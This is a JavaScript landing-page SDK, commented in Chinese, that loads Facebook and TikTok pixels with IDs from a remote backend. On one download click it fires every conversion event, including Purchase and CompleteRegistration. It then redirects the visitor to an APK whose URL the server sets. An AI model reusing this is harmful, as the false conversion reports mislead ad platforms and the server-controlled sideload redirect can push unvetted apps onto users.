// ============================================================
//  MeetU SDK v1.0 - 第三方调用核心库
//  功能：动态加载 Facebook Pixel + APK 下载跳转
//  兼容：支持自定义全局函数名，无痛集成
// ============================================================

(function(global) {
    'use strict';

    // ---------- 1. 基础配置 ----------
    var API_BASE = 'https://api.xcty68.vip';   // 你的后台地址
    var _site = global.location.origin + global.location.pathname;
    var _apkUrl = '';
    var _events = ['AddToCart', 'Contact', 'Lead', 'CompleteRegistration', 'Purchase', 'Download'];   // 默认全选，后台按落地页配置后覆盖
    var _ttIds = [];                                                                                     // TikTok 像素ID（后台按落地页配置后覆盖）
    var _ttEvents = ['ClickButton', 'Contact', 'AddToCart', 'CompleteRegistration'];                     // TikTok 转化事件默认全选

    console.log('[MeetU SDK] 站点:', _site, ' API:', API_BASE);

    // ---------- 2. Facebook Pixel 动态加载 (自启动) ----------
    // 加载 FB 核心库
    !function(f,b,e,v,n,t,s) {
        if(f.fbq)return;
        n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};
        if(!f._fbq)f._fbq=n;
        n.push=n;
        n.loaded=!0;
        n.version='2.0';
        n.queue=[];
        t=b.createElement(e);
        t.async=!0;
        t.src=v;
        s=b.getElementsByTagName(e)[0];
        s.parentNode.insertBefore(t,s)
    }(global, document,'script','https://connect.facebook.net/en_US/fbevents.js');

    // ---------- 2.5 TikTok Pixel 基础库注入 (自启动) ----------
    !function(w,d,t){
        w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script");n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
    }(global, document, 'ttq');

    // 拉取像素 ID 并初始化
    fetch(API_BASE + '/api/pixels?site=' + encodeURIComponent(_site))
        .then(function(r) { return r.json(); })
        .then(function(d) {
            console.log('[MeetU SDK] Pixel API 返回:', JSON.stringify(d));
            var ids = d.ids || [];
            if (Array.isArray(d.events)) { _events = d.events; }
            _ttIds = Array.isArray(d.tt_ids) ? d.tt_ids : [];
            if (Array.isArray(d.tt_events)) { _ttEvents = d.tt_events; }

            // Facebook 像素
            if (ids.length) {
                console.log('[MeetU SDK] 已加载 Facebook 像素:', ids);
                for (var i = 0; i < ids.length; i++) {
                    fbq('init', ids[i]);
                }
                fbq('track', 'PageView');

                var ns = document.createElement('div');
                ns.style.display = 'none';
                ns.innerHTML = ids.map(function(id) {
                    return '<img height="1" width="1" src="https://www.facebook.com/tr?id=' + id + '&ev=PageView&noscript=1"/>';
                }).join('');
                document.body.appendChild(ns);
            } else {
                console.warn('[MeetU SDK] Facebook 像素ID为空, site=' + _site);
            }

            // TikTok 像素（未配置则跳过；多个像素各 load 一次）
            if (_ttIds.length) {
                for (var k = 0; k < _ttIds.length; k++) {
                    ttq.load(_ttIds[k]);
                }
                ttq.page();
                console.log('[MeetU SDK] 已加载 TikTok 像素:', _ttIds);
            }
        })
        .catch(function() {
            console.warn('[MeetU SDK] 像素获取失败');
        });

    // ---------- 3. 核心下载方法 (供外部调用) ----------
    async function coreDownload(source) {
        // Facebook 转化事件（按后台勾选的事件触发；Download 为自定义事件）
        for (var i = 0; i < _events.length; i++) {
            var ev = _events[i];
            if (ev === 'Download') { fbq('trackCustom', 'Download'); }
            else { fbq('track', ev); }
        }

        // TikTok 转化事件（每个像素 × 每个已选事件）
        for (var k = 0; k < _ttIds.length; k++) {
            var inst = ttq.instance(_ttIds[k]);
            for (var j = 0; j < _ttEvents.length; j++) {
                inst.track(_ttEvents[j]);
            }
        }

        try {
            if (!_apkUrl) {
                var r = await fetch(API_BASE + '/api/apk-url?site=' + encodeURIComponent(_site));
                var d = await r.json();
                _apkUrl = d.url;
                console.log('[MeetU SDK] APK API 返回:', JSON.stringify(d));
            }
            if (_apkUrl) {
                global.location.href = _apkUrl;
            } else {
                alert('请配置下载地址.');
            }
        } catch (e) {
            alert('请配置下载地址.');
        }
    }

    // ---------- 4. 暴露给第三方（三种调用方式） ----------

    // 方式 A：挂载到全局对象 MeetU（推荐，避免命名冲突）
    global.MeetU = {
        download: coreDownload,
        version: '1.0'
    };

    // 方式 B：默认提供全局函数 window.k2（兼容你现有的 HTML）
    // 但如果第三方已经定义了 k2，则不覆盖
    if (typeof global.k2 === 'undefined') {
        global.k2 = coreDownload;
    }

    // 方式 C：支持第三方自定义函数名（终极灵活方案）
    // 第三方可以在引入此 JS 之前，设置 window.MeetUConfig = { functionName: 'miDescarga' };
    var config = global.MeetUConfig || {};
    if (config.functionName && typeof config.functionName === 'string') {
        var customName = config.functionName;
        // 只在目标不存在时才创建，防止覆盖第三方已有变量
        if (typeof global[customName] === 'undefined') {
            global[customName] = coreDownload;
            console.log('[MeetU SDK] 已创建自定义全局函数: window.' + customName);
        } else {
            console.warn('[MeetU SDK] 全局名称 "' + customName + '" 已被占用，未覆盖。');
        }
    }

    console.log('[MeetU SDK] 初始化完成。可调用: MeetU.download() 或 k2() 或自定义名称。');

})(window);
